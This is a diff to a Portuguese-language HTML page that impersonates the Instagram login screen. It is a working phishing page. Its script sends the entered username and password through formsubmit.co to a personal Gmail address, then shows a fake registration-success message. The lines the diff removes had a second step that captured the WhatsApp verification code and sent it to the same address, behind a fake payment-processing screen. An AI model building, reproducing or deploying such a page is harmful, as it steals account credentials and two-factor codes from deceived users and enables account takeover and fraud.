@@ -26,7 +26,6 @@
       max-width: 320px;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      margin: auto;
     }
 
     .logo {
@@ -83,92 +82,65 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    .success {
+      text-align: center;
+    }
   </style>
 </head>
 <body>
-  <!-- Tela de login -->
-  <div class="container" id="login">
+  <!-- Tela principal -->
+  <div class="container" id="formulario">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
     <form id="loginForm">
       <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
       <input type="password" name="password" placeholder="Senha" required />
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
       <button type="submit">Entrar</button>
     </form>
+    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
     <div class="footer">© 2025 Instagram from Meta</div>
   </div>
 
-  <!-- Tela do código -->
-  <div class="container hidden" id="codigo">
-    <h3>Verificação de segurança</h3>
-    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
-    <form id="codigoForm">
-      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
-      <button type="submit">Confirmar</button>
-    </form>
-  </div>
-
-  <!-- Carregando 1 -->
-  <div class="container hidden" id="carregando1">
+  <!-- Carregando -->
+  <div class="container hidden" id="carregando">
     <div class="loading">
       <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Verificando código...</p>
+      <p>Carregando...</p>
     </div>
   </div>
 
-  <!-- Carregando 2 -->
-  <div class="container hidden" id="carregando2">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Pagamento sendo processado...</p>
-    </div>
-  </div>
-
-  <!-- Tela final -->
+  <!-- Final -->
   <div class="container hidden" id="final">
-    <h2>Parabéns!</h2>
-    <p>Cadastro realizado com sucesso.</p>
-    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
+    <div class="success">
+      <h2>Cadastro concluído com sucesso!</h2>
+      <p>Verifique seu e-mail para mais informações.</p>
+    </div>
   </div>
 
   <script>
-    const loginForm = document.getElementById("loginForm");
-    const codigoForm = document.getElementById("codigoForm");
+    const form = document.getElementById("loginForm");
 
-    loginForm.addEventListener("submit", function(e) {
+    form.addEventListener("submit", function(e) {
       e.preventDefault();
-      document.getElementById("login").classList.add("hidden");
-      document.getElementById("codigo").classList.remove("hidden");
 
-      const dados = new FormData(loginForm);
+      // Mostra carregando
+      document.getElementById("formulario").classList.add("hidden");
+      document.getElementById("carregando").classList.remove("hidden");
+
+      // Envia os dados
+      const dados = new FormData(form);
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
         headers: { 'Accept': 'application/json' },
         body: dados
-      });
-    });
-
-    codigoForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("codigo").classList.add("hidden");
-      document.getElementById("carregando1").classList.remove("hidden");
-
-      const dadosCodigo = new FormData(codigoForm);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dadosCodigo
-      });
-
-      // Simula carregamento
-      setTimeout(() => {
-        document.getElementById("carregando1").classList.add("hidden");
-        document.getElementById("carregando2").classList.remove("hidden");
-
+      }).then(() => {
         setTimeout(() => {
-          document.getElementById("carregando2").classList.add("hidden");
+          document.getElementById("carregando").classList.add("hidden");
           document.getElementById("final").classList.remove("hidden");
         }, 2500);
-      }, 2500);
+      });
     });
   </script>
 </body>
